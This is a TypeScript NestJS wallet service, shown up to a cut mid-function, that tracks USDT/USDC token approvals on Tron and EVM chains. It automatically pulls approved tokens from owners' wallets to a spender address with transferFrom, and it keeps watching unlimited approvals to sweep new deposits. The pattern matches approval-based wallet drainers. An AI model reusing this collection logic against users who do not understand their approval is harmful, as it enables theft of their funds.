import {
  BadRequestException,
  Inject,
  Injectable,
  NotFoundException,
  UnauthorizedException,
} from "@nestjs/common";
import {
  CollectionIntentStatus,
  TransferAttemptStatus,
  type Prisma,
} from "@prisma/client";
import { createHash, randomUUID } from "crypto";
import { ethers } from "ethers";
import { TronWeb } from "tronweb";
import {
  applyConfirmedCollection,
  computeTransferable,
} from "../../jobs/processors/collection-policy";
import { safeCreateAuditLog } from "../../common/audit/safe-audit";
import {
  allocatePublicId,
  journeyWriteFields,
  normalizeJourneyId,
  tokenQualifier,
} from "../../common/ids/public-id.helper";
import { errorForLog, getErrorMessage } from "../../common/utils/error-message";
import { StructuredLoggerService } from "../../infrastructure/logger/structured-logger.service";
import { AdminEventsService } from "../../infrastructure/admin-events/admin-events.service";
import type { LogStatus } from "@trustmycard/shared/observability";
import { incrementCounter } from "@trustmycard/shared/observability";
import { ResourceManager } from "../resources/resource-manager.service";
import { CollectionIntentService } from "../collections/collection-intent.service";
import { ObservabilityService } from "../observability/observability.service";
import { COLLECTION_SIGNER, type CollectionSigner } from "../custody/signer";
import { ConfigService } from "../../config/config.service";
import { resolveApprovalStateAfterAllowanceCheck } from "./approval-state-sync";
import { PlatformConfigService } from "../../config/platform-config.service";
import { SETTING_KEYS } from "../../config/settings-keys";
import { addressesEqual } from "@trustmycard/shared/constants/self-spender";
import { TRANSFER_SKIP_REASONS } from "@trustmycard/shared/constants/collection";
import {
  COLLECTOR_RUN_LIMIT_REASON,
  type CollectorMaxRuns,
} from "@trustmycard/shared/constants/collector";
import { TOKEN_SETTLEMENT_ORDER } from "@trustmycard/shared/constants/settlement";
import {
  isTokenCollectionBlockingNative,
  resolveTokenCollectionState,
  summarizeNativeReadiness,
  TOKEN_COLLECTION_STATE_LABELS,
  type TokenCollectionLogicalState,
  type TokenCollectionSnapshot,
} from "@trustmycard/shared/constants/token-collection-state";

type TokenSymbol = "USDT" | "USDC";
type EvmChainKey = "eth" | "bsc" | "pol" | "avax" | "arb" | "base";
type TokenBalances = { native: string; usdt: string; usdc?: string };

import { prisma } from "../../infrastructure/database/prisma-shared";
const TRON_ADDRESS_RE = /^T[1-9A-HJ-NP-Za-km-z]{33}$/;
const EVM_ADDRESS_RE = /^0x[a-fA-F0-9]{40}$/;
const TRON_GRID = "https://api.trongrid.io";
const MAX_UINT256 =
  "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

const EVM_CHAIN_ID: Record<EvmChainKey, number> = {
  eth: 1,
  bsc: 56,
  pol: 137,
  avax: 43114,
  arb: 42161,
  base: 8453,
};
const EVM_RPCS: Record<EvmChainKey, string[]> = {
  eth: ["https://ethereum.publicnode.com", "https://cloudflare-eth.com"],
  bsc: ["https://bsc-dataseed.binance.org", "https://1rpc.io/bnb"],
  pol: ["https://polygon-bor.publicnode.com", "https://1rpc.io/matic"],
  avax: [
    "https://avalanche-c-chain.publicnode.com",
    "https://api.avax.network/ext/bc/C/rpc",
  ],
  arb: ["https://arbitrum-one.publicnode.com", "https://1rpc.io/arb"],
  base: ["https://base.publicnode.com", "https://1rpc.io/base"],
};

const TOKENS = {
  tron: {
    USDT: { address: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", decimals: 6 },
    USDC: { address: "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8", decimals: 6 },
  },
  eth: {
    USDT: {
      address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
      decimals: 6,
    },
    USDC: {
      address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
      decimals: 6,
    },
  },
  bsc: {
    USDT: {
      address: "0x55d398326f99059fF775485246999027B3197955",
      decimals: 18,
    },
    USDC: {
      address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
      decimals: 18,
    },
  },
  pol: {
    USDT: {
      address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
      decimals: 6,
    },
    USDC: {
      address: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359",
      decimals: 6,
    },
  },
  avax: {
    USDT: {
      address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7",
      decimals: 6,
    },
    USDC: {
      address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E",
      decimals: 6,
    },
  },
  arb: {
    USDT: {
      address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
      decimals: 6,
    },
    USDC: {
      address: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831",
      decimals: 6,
    },
  },
  base: {
    USDT: {
      address: "0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2",
      decimals: 6,
    },
    USDC: {
      address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
      decimals: 6,
    },
  },
} as const;

function decodeTronNodeMessage(message: unknown): string | null {
  if (typeof message !== "string" || !message) return null;
  try {
    if (/^[0-9a-fA-F]+$/.test(message) && message.length % 2 === 0) {
      return Buffer.from(message, "hex").toString("utf8");
    }
  } catch {
    // keep original message
  }
  return message;
}

function humanizeTronBroadcastError(args: {
  code?: string | null;
  message?: string | null;
}): string {
  const code = (args.code ?? "").trim().toUpperCase();
  const msg = (args.message ?? "").trim();

  if (
    code.includes("BANDWITH") ||
    code.includes("BANDWIDTH") ||
    /resource insufficient|bandwidth|energy/i.test(msg)
  ) {
    return (
      "Tron broadcast rejected: insufficient Bandwidth/Energy/TRX. " +
      "Add a small amount of TRX (or stake for energy), then try again. " +
      (msg ? `Node: ${msg}` : code ? `Code: ${code}` : "")
    ).trim();
  }

  if (code === "SIGERROR" || /signature/i.test(msg)) {
    return `Tron broadcast rejected: invalid signature. ${msg || code}`.trim();
  }

  if (msg) return `Tron broadcast failed: ${msg}${code ? ` (${code})` : ""}`;
  if (code) return `Tron broadcast failed: ${code}`;
  return "Tron broadcast rejected";
}

const WALLET_SERVICE_JOURNEY_STAGES = [
  "APPROVAL CONFIRM",
  "AUTO TRANSFER",
  "FRONTEND FLOW",
  "TRON BROADCAST",
] as const;

@Injectable()
export class WalletService {
  constructor(
    private readonly resourceManager: ResourceManager,
    private readonly logger: StructuredLoggerService,
    private readonly observability: ObservabilityService,
    private readonly adminEvents: AdminEventsService,
    private readonly collectionIntents: CollectionIntentService,
    private readonly configService: ConfigService,
    private readonly platformConfig: PlatformConfigService,
    @Inject(COLLECTION_SIGNER)
    private readonly collectionSigner: CollectionSigner,
  ) {}

  private nextCollectionCheck(failureCount = 0): Date {
    const intervalMs = this.configService.getCollectorConfig().intervalMs;
    const maxBackoff = this.platformConfig.getCollector().failureBackoffMax;
    const multiplier =
      failureCount > 0 ? Math.min(maxBackoff, 2 ** failureCount) : 1;
    return new Date(Date.now() + intervalMs * multiplier);
  }

  /** Fast retries when collection sees zero balance but allowance exists (RPC lag / post-approve timing). */
  private nextZeroBalanceRetryCheck(
    failureCount: number,
    network: string,
  ): Date {
    const transfer = this.platformConfig.getTransfer();
    const delays = [
      network === "tron"
        ? transfer.allowancePollDelayTronMs
        : transfer.allowancePollDelayEvmMs,
      2000,
      5000,
      10000,
      30000,
      60000,
    ];
    const idx = Math.min(Math.max(failureCount - 1, 0), delays.length - 1);
    return new Date(Date.now() + delays[idx]);
  }

  private rpcTimeoutMs(): number {
    return (
      Number(this.configService.get(SETTING_KEYS.COLLECTOR_RPC_TIMEOUT_MS)) ||
      this.platformConfig.getCollector().rpcTimeoutMs
    );
  }

  private collectorMaxRuns(): CollectorMaxRuns {
    return this.configService.getCollectorConfig().maxRuns;
  }

  /**
   * Atomically claims one collector run for an approval.
   * Returns null when the approval is missing, collection is disabled, or the run cap is reached.
   */
  private async claimCollectorRun(approvalId: string) {
    const maxRuns = this.collectorMaxRuns();
    const now = new Date();

    if (maxRuns == null) {
      const claimed = await prisma.approval.updateMany({
        where: {
          id: approvalId,
          collectionEnabled: true,
          status: { in: ["SUBMITTED", "ACTIVE", "PARTIALLY_USED"] },
        },
        data: {
          collectorRunCount: { increment: 1 },
          lastCheckedAt: now,
        },
      });
      if (claimed.count !== 1) return null;
      return prisma.approval.findUnique({ where: { id: approvalId } });
    }

    const claimed = await prisma.approval.updateMany({
      where: {
        id: approvalId,
        collectionEnabled: true,
        status: { in: ["SUBMITTED", "ACTIVE", "PARTIALLY_USED"] },
        collectorRunCount: { lt: maxRuns },
      },
      data: {
        collectorRunCount: { increment: 1 },
        lastCheckedAt: now,
      },
    });
    if (claimed.count === 1) {
      return prisma.approval.findUnique({ where: { id: approvalId } });
    }

    const approval = await prisma.approval.findUnique({
      where: { id: approvalId },
    });
    if (
      approval &&
      approval.collectionEnabled &&
      approval.collectorRunCount >= maxRuns
    ) {
      await prisma.approval.update({
        where: { id: approvalId },
        data: {
          collectionEnabled: false,
          nextCheckAt: null,
          leaseOwner: null,
          leaseUntil: null,
          lastError: COLLECTOR_RUN_LIMIT_REASON,
          lastCheckedAt: now,
        },
      });
      this.logFlow("COLLECTOR MAX RUNS REACHED", {
        approvalId,
        collectorRunCount: approval.collectorRunCount,
        maxRuns,
        network: approval.network,
        ownerAddress: approval.ownerAddress,
      });
    }
    return null;
  }

  private logFlow(stage: string, payload: Record<string, unknown> = {}): void {
    const isFailure = /FAILED|BLOCKED|ERROR/i.test(stage);
    const status =
      (payload.status as LogStatus | undefined) ??
      (isFailure
        ? "failure"
        : stage.includes("SUCCESS") ||
            stage.includes("COMPLETE") ||
            stage.includes("RESPONSE")
          ? "success"
          : "in_progress");
    const traceId = payload.traceId as string | undefined;
    const requestId = payload.requestId as string | undefined;

    this.logger.emit({
      level: isFailure ? "error" : "info",
      module: "wallet-service",
      operation: String(
        payload.operation ?? stage.toLowerCase().replace(/\s+/g, "_"),
      ),
      stage,
      status,
      message: stage,
      walletAddress:
        (payload.ownerAddress as string | undefined) ??
        (payload.address as string | undefined) ??
        (payload.owner as string | undefined),
      network: payload.network as string | undefined,
      token: payload.token as string | undefined,
      txHash: payload.txHash as string | undefined,
      traceId,
      requestId,
      context: payload,
      err: isFailure ? payload.error : undefined,
      skipSampling: isFailure,
    });

    const isJourneyStage = WALLET_SERVICE_JOURNEY_STAGES.some((prefix) =>
      stage.toUpperCase().startsWith(prefix),
    );
    if (isJourneyStage && traceId) {
      this.observability.schedulePersistLog({
        module: "wallet-service",
        operation: String(
          payload.operation ?? stage.toLowerCase().replace(/\s+/g, "_"),
        ),
        stage,
        status,
        level: isFailure ? "error" : "info",
        message: stage,
        walletAddress:
          (payload.owner as string | undefined) ??
          (payload.ownerAddress as string | undefined),
        network: payload.network as string | undefined,
        token: payload.token as string | undefined,
        txHash: payload.txHash as string | undefined,
        traceId,
        transactionId: traceId,
        sessionId: traceId,
        correlationId: traceId,
        requestId,
        context: payload,
      });
    }

    if (
      stage.includes("TRANSFER COMPLETED") ||
      stage.includes("TRANSFER SUCCESS")
    ) {
      incrementCounter("collector.transfers.completed", {
        network: String(payload.network ?? "unknown"),
        token: String(payload.token ?? "unknown"),
      });
    }
  }

  private getHeader(
    headers: Headers | Record<string, string | string[] | undefined>,
    name: string,
  ): string {
    if (headers && typeof (headers as Headers).get === "function") {
      return (headers as Headers).get(name)?.trim() ?? "";
    }
    const key = name.toLowerCase();
    const value = (headers as Record<string, string | string[] | undefined>)[
      key
    ];
    if (Array.isArray(value)) return String(value[0] ?? "").trim();
    return String(value ?? "").trim();
  }

  private spenderEvm() {
    return this.platformConfig.getWallets().spenderEvm;
  }
  private spenderTron() {
    return this.platformConfig.getWallets().spenderTron;
  }
  private spenderFor(network: string) {
    return this.platformConfig.spenderForNetwork(network);
  }

  /** Where transferFrom sends tokens. In self-spender dev mode, prefer DEV_COLLECTION_DEST_* when set. */
  private collectionDestinationFor(owner: string, network: string): string {
    const spender = this.spenderFor(network);
    if (
      !this.configService.getAllowSelfSpender() ||
      !addressesEqual(owner, spender)
    ) {
      return spender;
    }
    const devDest =
      network === "tron"
        ? String(process.env.DEV_COLLECTION_DEST_TRON ?? "").trim()
        : String(process.env.DEV_COLLECTION_DEST_EVM ?? "").trim();
    if (devDest) return devDest;
    this.logFlow("SELF SPENDER COLLECTION DEST WARNING", {
      network,
      owner,
      message:
        "Owner equals spender with ALLOW_SELF_SPENDER — set DEV_COLLECTION_DEST_EVM / DEV_COLLECTION_DEST_TRON for visible test collections",
    });
    return spender;
  }

  private ownerAddressFilter(
    owner: string,
    network: string,
  ): Prisma.ApprovalWhereInput {
    if (network === "tron") return { ownerAddress: owner };
    return { ownerAddress: { equals: owner, mode: "insensitive" } };
  }

  private spenderAddressFilter(
    spender: string,
    network: string,
  ): Prisma.ApprovalWhereInput {
    if (network === "tron") return { spenderAddress: spender };
    return { spenderAddress: { equals: spender, mode: "insensitive" } };
  }

  private async supersedeOtherApprovals(
    tx: Prisma.TransactionClient,
    args: {
      persistedId: string;
      owner: string;
      spender: string;
      network: string;
      token: string;
    },
  ): Promise<string[]> {
    const toSupersede = await tx.approval.findMany({
      where: {
        id: { not: args.persistedId },
        ...this.ownerAddressFilter(args.owner, args.network),
        ...this.spenderAddressFilter(args.spender, args.network),
        network: args.network,
        tokenSymbol: args.token,
        status: { in: ["SUBMITTED", "ACTIVE", "PARTIALLY_USED"] },
      },
      select: { id: true },
    });
    if (toSupersede.length === 0) return [];

    const ids = toSupersede.map((row) => row.id);
    await tx.approval.updateMany({
      where: { id: { in: ids } },
      data: {
        status: "SUPERSEDED",
        collectionEnabled: false,
        nextCheckAt: null,
        leaseOwner: null,
        leaseUntil: null,
      },
    });
    await tx.collectionIntent.updateMany({
      where: {
        approvalId: { in: ids },
        status: {
          in: [
            CollectionIntentStatus.CREATED,
            CollectionIntentStatus.QUEUED,
            CollectionIntentStatus.EXECUTING,
            CollectionIntentStatus.BROADCAST,
            CollectionIntentStatus.CONFIRMING,
          ],
        },
      },
      data: { status: CollectionIntentStatus.CANCELLED },
    });
    return ids;
  }

  /** When a new approval superseded an older one but collection landed on the sibling. */
  private async reconcileApprovalFromSiblingTransfer(
    approvalId: string,
  ): Promise<boolean> {
    const approval = await prisma.approval.findUnique({
      where: { id: approvalId },
    });
    if (!approval || BigInt(approval.collectedRaw || "0") > BigInt(0))
      return false;

    const siblingTransfer = await prisma.transfer.findFirst({
      where: {
        status: "confirmed",
        confirmedAt: { gte: approval.createdAt },
        approval: {
          id: { not: approvalId },
          ...this.ownerAddressFilter(approval.ownerAddress, approval.network),
          network: approval.network,
          tokenSymbol: approval.tokenSymbol,
        },
      },
      orderBy: { confirmedAt: "desc" },
      select: { amountRaw: true, txHash: true, confirmedAt: true },
    });
    if (!siblingTransfer?.txHash) return false;

    await prisma.$transaction([
      prisma.approval.update({
        where: { id: approvalId },
        data: {
          collectedRaw: siblingTransfer.amountRaw,
          collectionEnabled: false,
          lastError: null,
          failureCount: 0,
          nextCheckAt: null,
        },
      }),
      prisma.collectionIntent.updateMany({
        where: {
          approvalId,
          status: {
            in: [
              CollectionIntentStatus.CREATED,
              CollectionIntentStatus.QUEUED,
              CollectionIntentStatus.EXECUTING,
              CollectionIntentStatus.BROADCAST,
              CollectionIntentStatus.CONFIRMING,
              CollectionIntentStatus.FAILED,
              CollectionIntentStatus.BLOCKED,
            ],
          },
        },
        data: {
          status: CollectionIntentStatus.SETTLED,
          settledRaw: siblingTransfer.amountRaw,
          settledAt: siblingTransfer.confirmedAt ?? new Date(),
        },
      }),
    ]);
    this.logFlow("APPROVAL RECONCILED FROM SIBLING TRANSFER", {
      approvalId,
      network: approval.network,
      token: approval.tokenSymbol,
      siblingTxHash: siblingTransfer.txHash,
      amountRaw: siblingTransfer.amountRaw,
    });
    return true;
  }

  private tokenBalanceIsZero(tokenBalanceHuman: string): boolean {
    const trimmed = tokenBalanceHuman.trim();
    if (trimmed === "" || trimmed === "0") return true;
    const n = Number.parseFloat(trimmed);
    return Number.isFinite(n) && n <= 0;
  }

  /** Conservative gas units for ERC-20 transferFrom (estimateGas often fails when balance is zero). */
  private static readonly EVM_COLLECTOR_MIN_GAS_UNITS = 80_000;

  private isCollectorGasError(message: string): boolean {
    return /insufficient funds for intrinsic transaction cost|insufficient funds for transfer|INSUFFICIENT_FUNDS|gas required exceeds allowance|cannot estimate gas/i.test(
      message,
    );
  }

  private humanizeCollectorGasError(network: string, message: string): string {
    if (!this.isCollectorGasError(message)) {
      return message;
    }
    const chainLabels: Record<string, string> = {
      eth: "Ethereum",
      bsc: "BNB Chain",
      pol: "Polygon",
      avax: "Avalanche",
      arb: "Arbitrum",
      base: "Base",
      tron: "Tron",
    };
    const chain = chainLabels[network] ?? network.toUpperCase();
    const spender = this.spenderFor(network);
    return (
      `Collector wallet has insufficient native gas for transferFrom on ${chain}. ` +
      `Fund ${spender} with native coin, then retry collection.`
    );
  }

  private async ensureCollectorEvmGas(
    provider: ethers.providers.JsonRpcProvider,
    wallet: ethers.Wallet,
    network: EvmChainKey,
  ): Promise<void> {
    const balance = await provider.getBalance(wallet.address);
    const feeData = await provider.getFeeData();
    const maxFee =
      feeData.maxFeePerGas ??
      feeData.gasPrice ??
      ethers.BigNumber.from(0);
    const needed = maxFee.mul(
      WalletService.EVM_COLLECTOR_MIN_GAS_UNITS,
    );
    if (balance.lt(needed)) {
      throw new Error(
        this.humanizeCollectorGasError(
          network,
          "insufficient funds for intrinsic transaction cost",
        ),
      );
    }
  }

  private triggerImmediateCollection(approvalId: string): void {
    void this.runImmediateCollection(approvalId).catch((err) => {
      this.logFlow("IMMEDIATE COLLECTION FAILED", {
        approvalId,
        error: getErrorMessage(err),
      });
    });
  }

  private async runImmediateCollection(approvalId: string): Promise<void> {
    await this.processMonitoredApproval(approvalId);
  }

  /** Retry immediate collection when confirm saw on-chain balance but first transferFrom read zero. */
  private async runImmediateCollectionWithRetries(
    approvalId: string,
    opts?: { maxAttempts?: number },
  ): Promise<void> {
    const maxAttempts = opts?.maxAttempts ?? 5;
    const delayMs = this.platformConfig.getTransfer().allowancePollDelayEvmMs;
    for (let attempt = 0; attempt < maxAttempts; attempt++) {
      await this.processMonitoredApproval(approvalId);
      const approval = await prisma.approval.findUnique({
        where: { id: approvalId },
      });
      if (!approval) return;
      if (BigInt(approval.collectedRaw) > BigInt(0)) return;
      if (
        !approval.lastError?.includes(
          TRANSFER_SKIP_REASONS.zero_balance_at_collection,
        )
      ) {
        return;
      }
      if (attempt < maxAttempts - 1) await sleep(delayMs);
    }
  }

  private pendingCollectionIntentStatuses(): CollectionIntentStatus[] {
    return [
      CollectionIntentStatus.CREATED,
      CollectionIntentStatus.QUEUED,
      CollectionIntentStatus.EXECUTING,
      CollectionIntentStatus.BROADCAST,
      CollectionIntentStatus.CONFIRMING,
      CollectionIntentStatus.FAILED,
      CollectionIntentStatus.BLOCKED,
    ];
  }

  /** Fixed-amount approvals with nothing left to collect — stop monitoring permanently. */
  private async markCollectionNothingToCollect(
    approvalId: string,
    reason: string,
  ): Promise<void> {
    const now = new Date();
    await prisma.$transaction([
      prisma.collectionIntent.updateMany({
        where: {
          approvalId,
          status: { in: this.pendingCollectionIntentStatuses() },
        },
        data: { status: CollectionIntentStatus.CANCELLED },
      }),
      prisma.approval.update({
        where: { id: approvalId },
        data: {
          collectionEnabled: false,
          lastCheckedAt: now,
          lastError: reason,
          nextCheckAt: null,
          leaseOwner: null,
          leaseUntil: null,
        },
      }),
    ]);
  }

  /**
   * Unlimited approvals keep monitoring after a zero balance — schedule the next
   * collector tick and settle or cancel settlement intents without disabling collection.
   */
  private async scheduleUnlimitedDepositWatch(
    approvalId: string,
    args: { collectedRaw: bigint; failureCount: number },
  ): Promise<void> {
    const now = new Date();
    const approvalRow = await prisma.approval.findUnique({
      where: { id: approvalId },
      select: { network: true },
    });
    const network = approvalRow?.network ?? "eth";
    const pendingIntentFilter = {
      approvalId,
      status: { in: this.pendingCollectionIntentStatuses() },
    };
    const intentUpdate =
      args.collectedRaw > BigInt(0)
        ? prisma.collectionIntent.updateMany({
            where: pendingIntentFilter,
            data: {
              status: CollectionIntentStatus.SETTLED,
              settledRaw: args.collectedRaw.toString(),
              settledAt: now,
            },
          })
        : prisma.collectionIntent.updateMany({
            where: pendingIntentFilter,
            data: { status: CollectionIntentStatus.CANCELLED },
          });

    const nextCheckAt =
      args.collectedRaw > BigInt(0)
        ? this.nextCollectionCheck(args.failureCount)
        : this.nextZeroBalanceRetryCheck(args.failureCount + 1, network);
    const nextFailureCount =
      args.collectedRaw > BigInt(0) ? 0 : args.failureCount + 1;
    await prisma.$transaction([
      intentUpdate,
      prisma.approval.update({
        where: { id: approvalId },
        data: {
          collectionEnabled: true,
          lastCheckedAt: now,
          lastError:
            args.collectedRaw > BigInt(0)
              ? null
              : TRANSFER_SKIP_REASONS.zero_balance_at_collection,
          nextCheckAt,
          failureCount: nextFailureCount,
          leaseOwner: null,
          leaseUntil: null,
        },
      }),
    ]);
  }
  private parseToken(raw: unknown): TokenSymbol {
    const s = String(raw ?? "USDT")
      .trim()
      .toUpperCase();
    if (s === "USDT" || s === "USDC") return s;
    throw new BadRequestException("token must be USDT or USDC");
  }
  private isEvm(network: string): network is EvmChainKey {
    return ["eth", "bsc", "pol", "avax", "arb", "base"].includes(network);
  }
  private getToken(network: string, token: TokenSymbol) {
    if (network === "tron") return TOKENS.tron[token];
    if (this.isEvm(network)) return TOKENS[network][token];
    return null;
  }
  private parseHumanToRaw(human: string, decimals: number): bigint {
    const cleaned = human.trim().replace(/,/g, "");
    if (!/^\d+(\.\d+)?$/.test(cleaned))
      throw new BadRequestException("Invalid amountHuman");
    const [whole, frac = ""] = cleaned.split(".");
    const fracPadded = (frac + "0".repeat(decimals)).slice(0, decimals);
    return (
      BigInt(whole) * BigInt(10) ** BigInt(decimals) + BigInt(fracPadded || "0")
    );
  }
  private formatUnits(value: bigint, decimals: number): string {
    const base = BigInt(10) ** BigInt(decimals);
    const whole = value / base;
    const frac = (value % base)
      .toString()
      .padStart(decimals, "0")
      .replace(/0+$/, "");
    return frac ? `${whole}.${frac}` : whole.toString();
  }
  private encodeApprove(spender: string, amount: bigint): string {
    const pad = (v: string) =>
      v.replace(/^0x/i, "").toLowerCase().padStart(64, "0");
    return `0x095ea7b3${pad(spender)}${pad(amount.toString(16))}`;
  }
  private base58ToHex(base58: string): string {
    let num = BigInt(0);
    for (const ch of base58) {
      const i = ALPHABET.indexOf(ch);
      if (i < 0) throw new BadRequestException("Invalid base58 address");
      num = num * BigInt(58) + BigInt(i);
    }
    let hex = num.toString(16);
    if (hex.length % 2) hex = `0${hex}`;
    let leading = 0;
    for (const ch of base58) {
      if (ch === "1") leading += 1;
      else break;
    }
    hex = `${"00".repeat(leading)}${hex}`;
    if (hex.length < 8) throw new BadRequestException("Address too short");
    return hex.slice(0, -8);
  }
  private tronAddressToAbiWord(base58: string): string {
    const hex = this.base58ToHex(base58);
    const body = hex.startsWith("41") ? hex.slice(2) : hex.slice(-40);
    return body.padStart(64, "0");
  }
  private async rpcCall(
    rpc: string,
    method: string,
    params: unknown[],
  ): Promise<string> {
    const res = await fetch(rpc, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }),
      cache: "no-store",
      signal: AbortSignal.timeout(this.rpcTimeoutMs()),
    });
    const json = (await res.json()) as {
      result?: string;
      error?: { message?: string };
    };
    if (!res.ok || json.error)
      throw new Error(json.error?.message || `RPC ${res.status}`);
    return json.result ?? "0x0";
  }

  private async evmRpcCall(
    network: EvmChainKey,
    method: string,
    params: unknown[],
  ): Promise<string> {
    let lastError: unknown;
    for (const rpc of EVM_RPCS[network]) {
      try {
        return await this.rpcCall(rpc, method, params);
      } catch (err) {
        lastError = err;
      }
    }
    throw lastError instanceof Error
      ? lastError
      : new Error(`All ${network} RPC endpoints failed`);
  }
  private async recordAudit(
    actor: string,
    action: string,
    entityType: string,
    payload: Record<string, unknown>,
    entityId?: string,
  ): Promise<void> {
    await safeCreateAuditLog(
      prisma,
      {
        actor,
        action,
        entityType,
        entityId,
        payload: payload as Prisma.InputJsonValue,
      },
      this.logger,
    );
  }

  private getAdminEvmPrivateKey(): string {
    return this.platformConfig.getWallets().adminEvmPrivateKey;
  }

  private getAdminTronPrivateKey(): string {
    return this.platformConfig.getWallets().adminTronPrivateKey;
  }

  private tronHeaders(): Record<string, string> {
    const headers: Record<string, string> = {
      "content-type": "application/json",
    };
    const apiKey = this.platformConfig.getChains().trongridApiKey;
    if (apiKey) headers["TRON-PRO-API-KEY"] = apiKey;
    return headers;
  }

  private toRawFromHuman(value: string, decimals: number): bigint {
    const cleaned = value.trim();
    if (!cleaned || cleaned.toUpperCase() === "UNLIMITED") {
      throw new BadRequestException(
        "transferAmountHuman must be a finite number",
      );
    }
    return this.parseHumanToRaw(cleaned, decimals);
  }

  private async readTokenBalanceRaw(
    network: string,
    owner: string,
    token: TokenSymbol,
  ): Promise<bigint> {
    const tokenInfo = this.getToken(network, token);
    if (!tokenInfo) throw new BadRequestException("Unsupported network/token");

    if (network === "tron") {
      const parameter = this.tronAddressToAbiWord(owner);
      const res = await fetch(`${TRON_GRID}/wallet/triggerconstantcontract`, {
        method: "POST",
        headers: this.tronHeaders(),
        body: JSON.stringify({
          owner_address: owner,
          contract_address: tokenInfo.address,
          function_selector: "balanceOf(address)",
          parameter,
          visible: true,
        }),
        cache: "no-store",
        signal: AbortSignal.timeout(this.rpcTimeoutMs()),
      });
      const json = (await res.json().catch(() => ({}))) as {
        constant_result?: string[];
      };
      const hex = json.constant_result?.[0];
      return hex ? BigInt(`0x${hex}`) : BigInt(0);
    }

    if (!this.isEvm(network))
      throw new BadRequestException("Unsupported EVM network");
    const data = `0x70a08231${owner.slice(2).toLowerCase().padStart(64, "0")}`;
    const raw = await this.evmRpcCall(network, "eth_call", [
      { to: tokenInfo.address, data },
      "latest",
    ]);
    return BigInt(raw);
  }

  private async readTokenBalanceRawWithRetry(
    network: string,
    owner: string,
    token: TokenSymbol,
    maxAttempts = 4,
  ): Promise<bigint> {
    const delayMs =
      network === "tron"
        ? this.platformConfig.getTransfer().allowancePollDelayTronMs
        : this.platformConfig.getTransfer().allowancePollDelayEvmMs;
    let balance = await this.readTokenBalanceRaw(network, owner, token);
    for (let i = 1; i < maxAttempts && balance <= BigInt(0); i++) {
      await sleep(delayMs);
      balance = await this.readTokenBalanceRaw(network, owner, token);
    }
    return balance;
  }

  private async executeEvmTransferFrom(args: {
    transferId: string;
    approvalId: string;
    network: EvmChainKey;
    tokenAddress: string;
    owner: string;
    to: string;
    amountRaw: bigint;
    waitForConfirmation?: boolean;
  }): Promise<{ txHash: string; blockNumber: number | null }> {
    const provider = new ethers.providers.JsonRpcProvider(
      EVM_RPCS[args.network][0],
    );
    const wallet = await this.collectionSigner.evmWallet(provider);
    const configuredSpender = this.spenderEvm().toLowerCase();
    if (
      configuredSpender &&
      wallet.address.toLowerCase() !== configuredSpender
    ) {
      throw new BadRequestException(
        "ADMIN_EVM_PRIVATE_KEY does not match configured spender address",
      );
    }

    let transfer = await prisma.transfer.findUniqueOrThrow({
      where: { id: args.transferId },
    });
    let signedPayload =
      transfer.payloadKind === "evm" ? transfer.signedPayload : null;
    let txHash = transfer.payloadKind === "evm" ? transfer.txHash : null;

    if (!signedPayload || !txHash) {
      await this.ensureCollectorEvmGas(provider, wallet, args.network);

      const iface = new ethers.utils.Interface([
        "function transferFrom(address from,address to,uint256 value)",
      ]);
      const data = iface.encodeFunctionData("transferFrom", [
        args.owner,
        args.to,
        args.amountRaw.toString(),
      ]);
      let populated;
      try {
        populated = await wallet.populateTransaction({
          to: args.tokenAddress,
          data,
          value: 0,
        });
      } catch (err) {
        throw new Error(
          this.humanizeCollectorGasError(args.network, getErrorMessage(err)),
        );
      }
      signedPayload = await wallet.signTransaction(populated);
      txHash = ethers.utils.keccak256(signedPayload);
      transfer = await prisma.transfer.update({
        where: { id: args.transferId },
        data: {
          signedPayload,
          payloadKind: "evm",
          txHash,
          status: "prepared",
          errorMessage: null,
        },
      });
    }

    try {
      await provider.sendTransaction(signedPayload);
    } catch (err) {
      const message = getErrorMessage(err);
      if (
        !/already known|known transaction|nonce has already been used|nonce too low/i.test(
          message,
        )
      ) {
        throw new Error(this.humanizeCollectorGasError(args.network, message));
      }
    }
    await prisma.transfer.update({
      where: { id: transfer.id },
      data: {
        status: "broadcast",
        broadcastAt: transfer.broadcastAt ?? new Date(),
      },
    });
    this.notifyTransferUpdated({
      transferId: transfer.id,
      status: "broadcast",
      approvalId: args.approvalId,
      ownerAddress: args.owner,
      network: args.network,
      txHash,
    });
    if (!args.waitForConfirmation) {
      return { txHash, blockNumber: null };
    }

    const receipt = await provider.waitForTransaction(
      txHash,
      1,
      this.platformConfig.getTransfer().evmTxConfirmTimeoutMs,
    );
    if (!receipt) throw new Error("Transaction confirmation timeout");
    if (!receipt || receipt.status !== 1) {
      throw new Error("EVM transferFrom transaction failed");
    }
    return { txHash, blockNumber: receipt.blockNumber ?? null };
  }

  private async executeTronTransferFrom(args: {
    transferId: string;
    approvalId: string;
    network: string;
    tokenAddress: string;
    owner: string;
    to: string;
    amountRaw: bigint;
    waitForConfirmation?: boolean;
  }): Promise<{ txHash: string; blockNumber: number | null }> {
    const signer = await this.collectionSigner.tronSigner();
    const { tron, privateKey: pk, address: spenderAddress } = signer;
    const configuredSpender = this.spenderTron();
    if (configuredSpender && spenderAddress !== configuredSpender) {
      throw new BadRequestException(
        "ADMIN_TRON_PRIVATE_KEY does not match configured spender address",
      );
    }

    let transfer = await prisma.transfer.findUniqueOrThrow({
      where: { id: args.transferId },
    });
    let signed: Record<string, unknown> | null = null;
